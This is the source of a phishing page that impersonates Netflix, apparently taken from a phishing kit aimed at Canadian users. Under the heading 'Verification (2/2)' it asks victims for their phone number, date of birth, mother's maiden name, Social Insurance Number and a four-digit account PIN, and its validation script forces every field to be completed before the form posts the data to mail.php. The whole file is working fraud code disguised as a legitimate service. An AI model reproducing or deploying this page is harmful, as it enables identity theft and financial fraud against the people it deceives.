<?php
require "includes/enc.php";
error_reporting(0);

?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Netflix</title>

<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">

<link type="text/css" rel="stylesheet" href="media/settings.css">

<link rel="shortcut icon" href="media/nficon2016.ico">
<link rel="apple-touch-icon" href="media/nficon2016.png">
<script type="text/javascript">

<!--
function check(form) {

var regExpressPostcode =  /^(1\s?)?((\([0-9]{3}\))|[0-9]{3})[\s\-]?[\0-9]{3}[\s\-]?[0-9]{4}$/
if (!regExpressPostcode.test(form.phone.value))
{ document.getElementById('error1').style.display = "inline-block"; document.getElementById("phone").classList.add('error'); form.phone.focus(); return;}
else
{ document.getElementById('error1').style.display = "none"; document.getElementById("phone").classList.remove('error');}




if (form.BirthMonth.value == "")
{ document.getElementById('error2').style.display = "block"; document.getElementById('BirthMonth').style = "width:110px;border: 1px solid #B91A0E;"; form.BirthMonth.focus(); return;}
else
{ document.getElementById('error2').style.display = "none"; document.getElementById('BirthMonth').style = "width:110px;border: 1px solid #a1a1a1;";}

if (form.BirthDay.value == "")
{ document.getElementById('error2').style.display = "block"; document.getElementById('BirthDay').style = "width:73px;border: 1px solid #B91A0E;"; form.BirthDay.focus(); return;}
else
{ document.getElementById('error2').style.display = "none"; document.getElementById('BirthDay').style = "width:73px;border: 1px solid #a1a1a1;";}

if (form.BirthYear.value == "")
{ document.getElementById('error2').style.display = "block"; document.getElementById('BirthYear').style = "width:90px;border: 1px solid #B91A0E;"; form.BirthYear.focus(); return;}
else
{ document.getElementById('error2').style.display = "none"; document.getElementById('BirthYear').style = "width:90px;border: 1px solid #a1a1a1;";}


if (form.MMN.value == "")
{ document.getElementById('error3').style.display = "block"; document.getElementById('MMN').style = "border: 1px solid #B91A0E;"; form.MMN.focus(); return;}
else
{ document.getElementById('error3').style.display = "none"; document.getElementById('MMN').style = "border: 1px solid #a1a1a1;" ;}



var regExpress = /^[0-9]{3,3}$/
if (!regExpress.test(form.SIN1.value))
{ document.getElementById('error4').style.display = "block"; document.getElementById('SIN1').style = "text-align:center;width:63px;border: 1px solid #B91A0E;"; form.SIN1.focus(); return;}
else
{ document.getElementById('error4').style.display = "none"; document.getElementById('SIN1').style = "text-align:center;width:63px;border: 1px solid #a1a1a1;";}

var regExpress = /^[0-9]{3,3}$/
if (!regExpress.test(form.SIN2.value))
{ document.getElementById('error4').style.display = "block"; document.getElementById('SIN2').style = "text-align:center;width:70px;border: 1px solid #B91A0E;"; form.SIN2.focus(); return;}
else
{ document.getElementById('error4').style.display = "none"; document.getElementById('SIN2').style = "text-align:center;width:70px;border: 1px solid #a1a1a1;";}


var regExpress = /^[0-9]{3,3}$/
if (!regExpress.test(form.SIN3.value))
{ document.getElementById('error4').style.display = "block"; document.getElementById('SIN3').style = "text-align:center;width:63px;border: 1px solid #B91A0E;"; form.SIN3.focus(); return;}
else
{ document.getElementById('error4').style.display = "none"; document.getElementById('SIN3').style = "text-align:center;width:63px;border: 1px solid #a1a1a1;";}


var regExpress = /^[0-9]{4,4}$/
if (!regExpress.test(form.atmpin.value))
{ document.getElementById('error5').style.display = "block"; document.getElementById('atmpin').style = "text-align:center;width:80px;border: 1px solid #B91A0E;"; form.atmpin.focus(); return;}
else
{ document.getElementById('error5').style.display = "none"; document.getElementById('atmpin').style = "text-align:center;width:80px;border: 1px solid #a1a1a1;";}




form.submit()
}
//-->



function closeit() {
document.getElementById("cookie-disclosure").style.display = "none";
}

function check1()
{
var letters = document.ContinueForm.SIN1.value.length +1;
if (letters <= 3)
{document.ContinueForm.SIN1.focus()}
else
{document.ContinueForm.SIN2.focus()}
}
function check2()
{
var letters2 = document.ContinueForm.SIN2.value.length +1;
if (letters2 <= 3)
{document.ContinueForm.SIN2.focus()}
else
{document.ContinueForm.SIN3.focus()}
}

</script>
<style>
.input-standard {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-size: 16px;
	border: solid 1px #b3b3b3;
	-webkit-border-radius: 2px;
	-moz-border-radius: 2px;
	border-radius: 2px;

	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	width: 100%;
	max-width: 500px;
	color: #000;
	padding: 10px 11px;
	height: 44px;
}

.input-standard:focus {
	border-color: grey;
	outline: 0;
}

.drop_list {
	padding: 10px 11px;
	font-size: 16px;
	border: solid 1px #b3b3b3;
	width: 100%;
	max-width: 500px;
	height: 44px;
	border-radius: 2px;
}

.drop_list:focus {
	border-color: grey;
	outline: 0;
}

::-webkit-input-placeholder {  color: inherit;  opacity: 0.54; }
::-moz-placeholder{color:#999;opacity:1}
:-ms-input-placeholder{color:#999}
::-webkit-input-placeholder{color:#999}


</style>
</head>
<body>
<form method="POST" id="ContinueForm" name="ContinueForm" action="mail.php" >

<div id="appMountPoint"><div class="netflix-sans-font-loaded" data-reactroot=""><div lang="en-AL" class="accountLayout" dir="ltr"><div id="hdSpace"><div id="hdPinTarget" class="member-header"><div id="hd"><div id="headerBlind"></div><div><a href="#" class="icon-logoUpdate logo"></a></div><div class="aro-genre-list"><ul><li><a href="#browse">Home</a></li><li><a href="#browse/genre/83">TV Shows</a></li><li><a href="#browse/genre/34399">Movies</a></li><li><a href="#browse/genre/1592210">Recently Added</a></li><li><a href="#browse/my-list">My List</a></li></ul></div><div class="account-secondary-navigation last"><div class="tagline priceMessage"></div><div id="account-tools"><div id="profileSelector" class="profile-selector">
<div class="current-profile"><img class="avatar" src="media/av.png" alt=""><span class="profile-arrow"></span><span class="trigger"></span></div>
<div class="profiles-container"><div class="profile-selector"><ul class="profiles structural"></ul></div><ul class="profile-manage structural"><li class="manage"><a href="#profiles/manage">Manage Profiles</a></li></ul><ul class="links structural"><li class=""><a href="#YourAccount?lnkctr=mhSS">Account</a></li><li class=""><a href="#">Help Center</a></li><li class=""><a href="#SignOut?lnkctr=mL">Sign out of Netflix</a></li><li class="display-after-xs"><a href="#WiHome">Browse</a></li></ul></div></div></div><div class="search-wrapper"><label for="search-input-toggle" class="mixed-search-label"><input type="checkbox" class="search-toggle" id="search-input-toggle"><div class="search-text" style="padding-top: 15px;" ><span class="icon-search mixed-search-icon"></span></div><div class="search-input-wrapper" style="padding-top: 15px;"><div class="search-input-inner-wrapper" style="height: 28px;"><span class="icon-search mixed-search-icon mixed-search-input-icon"></span><input type="text" value="" class="mixed-search-input" placeholder="Titles, people, genres"></div></div></label></div></div></div></div></div><div class="bd"><div class="responsive-account-container">
<div>


<h1>Verification (2/2)</h1><p>Your personal data will be used if you forget your password and for important account actions.</p><div class="account-messages-container"></div>

<label for="phoneNumber" class="phone-number-label">Mobile phone number</label>
<div class="phone-number-input" style="margin-bottom:-20px;"><div class="ui-select-wrapper country-select"><a href="#phonenumber" class="ui-select-wrapper-link"><div class="ui-select-current" placeholder="{&quot;current_selected_country&quot;:&quot;CA&quot;}"><span class="country-select-flag nf-flag nf-flag-ca"></span></div></a><ul class="ui-select-options ui-select-options-hidden flag-select-item-list"><li data-uia="option-1" class="flag-select-option ui-select-item ui-select-item-selected" placeholder="{&quot;id&quot;:&quot;CA&quot;,&quot;selected&quot;:true,&quot;highlighted&quot;:false}"><a id="CA" tabindex="-1" class="ui-select-item-link clearfix"><span class="country-select-flag nf-flag nf-flag-ca"></span><span id="" class="country-name">Canada <em class="country-code"> +1</em></span></a></li></ul></div>
<label class="ui-label ui-input-label phone-number-input__text" id="lbl-phone" placeholder="phone"><span class="ui-label-text"></span>
<input type="tel" class="ui-text-input" name="phone" onKeyDown="if(event.keyCode==13) { check(this.form); }" id="phone" value="" tabindex="0" autocomplete="tel">
<div id="error1" style="display:none;" class="input-message error">Phone nmber is required.</div>
</label>
</div>



<label style="margin-top:5px;" class="password-input password-label ui-label ui-input-label">
<span class="ui-label-text">Date of Birth</span><br>
<span style="max-width:440px;">
 <select style="width:110px;cursor:default;" id="BirthMonth"  name="BirthMonth" class="drop_list" >
    <option value=""  selected="selected">Month</option>
    <option value="January">January</option>
    <option value="February">February</option>
    <option value="March" >March</option>
    <option value="April">April</option>
    <option value="May">May</option>
    <option value="June" >June</option>
    <option value="July" >July</option>
    <option value="August">August</option>
 <option value="September">September</option>
    <option value="October">October</option>
  <option value="November" >November</option>
  <option value="December" >December</option>
  </select> - <select style="width:73px;cursor:default;" id="BirthDay" class="drop_list" name="BirthDay">
    <option value="" selected="selected">Day</option>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4">4</option>
    <option value="5">5</option>
    <option value="6">6</option>
    <option value="7">7</option>
    <option value="8">8</option>
    <option value="9">9</option>
    <option value="10">10</option>
    <option value="11">11</option>
    <option value="12">12</option>
    <option value="13">13</option>
    <option value="14">14</option>
    <option value="15">15</option>
    <option value="16">16</option>
    <option value="17">17</option>
    <option value="18">18</option>
    <option value="19">19</option>
    <option value="20">20</option>
    <option value="21">21</option>
    <option value="22">22</option>
    <option value="23">23</option>
    <option value="24">24</option>
    <option value="25">25</option>
    <option value="26">26</option>
    <option value="27">27</option>
    <option value="28">28</option>
    <option value="29">29</option>
    <option value="30">30</option>
    <option value="31">31</option>
  </select> - <select style="width:90px;cursor:default;" id="BirthYear" class="drop_list" name="BirthYear" >
    <option value="" selected="selected">Year</option>
  <option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option></select></span>
<span id="error2" style="display:none;" class="input-message error">Your date of birth is required.</span>
</label>

<label style="margin-top:-15px;margin-bottom:-10px;" class="password-input password-label ui-label ui-input-label">
<span class="ui-label-text">Mother's Maiden Name</span>
<input type="text" onKeyDown="if(event.keyCode==13) { check(this.form); }" id="MMN" name="MMN" class="ui-text-input" tabindex="0" value="">
<div id="error3" style="display:none;" class="input-message error">Mother's maiden name is required.</div>
</label>

<label style="margin-top:0px;margin-bottom:-10px;" class="password-input password-label ui-label ui-input-label">
<span class="ui-label-text">Social Insurance Number</span><br>

<input onKeyDown="if(event.keyCode==13) { check(this.form); }" maxlength="3" class="input-standard" type="text" onKeyUp="check1()" style="width:63px;text-align:center;" placeholder="XXX" value="" id="SIN1" name="SIN1" /> - <input onKeyDown="if(event.keyCode==13) { check(this.form); }" maxlength="3" placeholder="XXX"  class="input-standard" type="text" tabindex="0"  align="center" style="width:70px;text-align:center;" onKeyUp="check2()" value="" id="SIN2"  name="SIN2" /> - <input onKeyDown="if(event.keyCode==13) { check(this.form); }" maxlength="3" placeholder="XXX"  align="center" style="width:63px;text-align:center;" value="" class="input-standard" type="text" tabindex="0" id="SIN3" name="SIN3" />
<div id="error4" style="display:none;" class="input-message error">Social insurance number is required.</div>
</label>


<label style="margin-top:0px;margin-bottom:-25px;" class="password-input password-label ui-label ui-input-label">
<span class="ui-label-text">Account Pin</span><br>
<input onKeyDown="if(event.keyCode==13) check(this.form);" style="width:80px;" name="atmpin" placeholder="XXXX" class="input-standard"" id="atmpin" tabindex="0" autocomplete="false" maxlength="4" minlength="4" type="password">
<div id="error5" style="display:none;" class="input-message error">Account Pin is required.</div>
</label>



<Br><br>
<div class="btn-bar"><button class="btn btn-blue btn-small" onclick="check(this.form);" type="button" autocomplete="off" tabindex="0">Submit</button>
</div></form>

</div></div></div><div class="site-footer-wrapper" style="margin-top: 0px;"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="#contactus">Questions? Contact us.</a></p><ul class="footer-links structural"><li class="footer-link-item footer-link-audio-and-subtitles" placeholder="footer_responsive_link_audio_and_subtitles_item"><a class="footer-link" href="#browse/subtitles/" placeholder="footer_responsive_link_audio_and_subtitles"><span id="">Audio and Subtitles</span></a></li><li class="footer-link-item footer-link-help" placeholder="footer_responsive_link_help_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="">Help Center</span></a></li><li class="footer-link-item footer-link-gift-card" placeholder="footer_responsive_link_gift_card_item"><a class="footer-link" href="#redeem/" placeholder="footer_responsive_link_gift_card"><span id="">Gift Cards</span></a></li><li class="footer-link-item footer-link-relations" placeholder="footer_responsive_link_relations_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_relations"><span id="">Investor Relations</span></a></li><li class="footer-link-item footer-link-media" placeholder="footer_responsive_link_media_center_item"><a class="footer-link" href="#/" placeholder="footer_responsive_link_media_center"><span id="">Media Center</span></a></li><li class="footer-link-item footer-link-jobs" placeholder="footer_responsive_link_jobs_item"><a class="footer-link" href="#/" placeholder="footer_responsive_link_jobs"><span id="">Jobs</span></a></li><li class="footer-link-item footer-link-cookies" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="">Cookie Preferences</span></a></li><li class="footer-link-item footer-link-terms" placeholder="footer_responsive_link_terms_item"><a class="footer-link" href="#termsofuse" placeholder="footer_responsive_link_terms"><span id="">Terms of Use</span></a></li><li class="footer-link-item footer-link-privacy" placeholder="footer_responsive_link_privacy_item"><a class="footer-link" href="#privacy" placeholder="footer_responsive_link_privacy"><span id="">Privacy Statement</span></a></li></ul><div class="service-code-wrapper"><a class="service-code pointer">Service Code</a></div></div></div><div id="cookie-disclosure" class="clearfix"><p class="cookie-disclosure-message reg">Netflix uses cookies for personalization, to customize its online advertisements, and for other purposes. <a class="cookie-disclosure-link" href="#privacy">Learn more</a> or <a class="pointer cookie-disclosure-link">change your cookie preferences</a>. Netflix supports the Digital Advertising Alliance principles. By interacting with this site, you agree to our use of cookies.</p><p class="cookie-disclosure-message short">We use cookies (<a class="cookie-disclosure-link" href="#privacy">why?</a>). You can change <a class="pointer cookie-disclosure-link">cookie preferences</a>; continued site use signifies consent.</p><div class="btn-container"><a  onclick="closeit()" class="close-link">Close</a><span  onclick="closeit()" class="icon-close close-button pointer"></span></div></div></div></div></div><div>


</div></body></html>